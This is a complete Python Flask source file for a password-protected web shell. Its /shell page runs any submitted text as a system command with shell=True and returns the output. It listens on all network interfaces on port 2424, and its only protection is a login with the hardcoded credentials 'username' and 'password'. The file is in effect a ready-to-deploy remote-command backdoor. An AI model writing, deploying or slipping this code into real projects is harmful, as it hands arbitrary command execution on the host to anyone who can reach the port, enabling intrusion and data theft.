from flask import Flask, request, render_template, redirect, url_for, session
import subprocess
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Secret key for sessions

# User credentials for authentication
USERNAME = 'username'
PASSWORD = 'password'

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('shell'))
        else:
            return 'Login failed. Please try again.'
    return '''
        <form method="post">
            <p><input type=text name=username>
            <p><input type=password name=password>
            <p><input type=submit value=Login>
        </form>
    '''

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/shell', methods=['GET', 'POST'])
def shell():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    if request.method == 'POST':
        command = request.form.get('command')
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            return result
        except subprocess.CalledProcessError as e:
            return f"Error: {e.returncode}\n{e.output}"
    return '''
        <html>
        <head><title>Interactive Shell</title></head>
        <body>
            <h1>Welcome to the Interactive Shell</h1>
            <form method="post">
                <input type="text" name="command" size="50">
                <input type="submit" value="Run Command">
            </form>
            <br>
            <a href="/logout">Logout</a>
        </body>
        </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=2424)
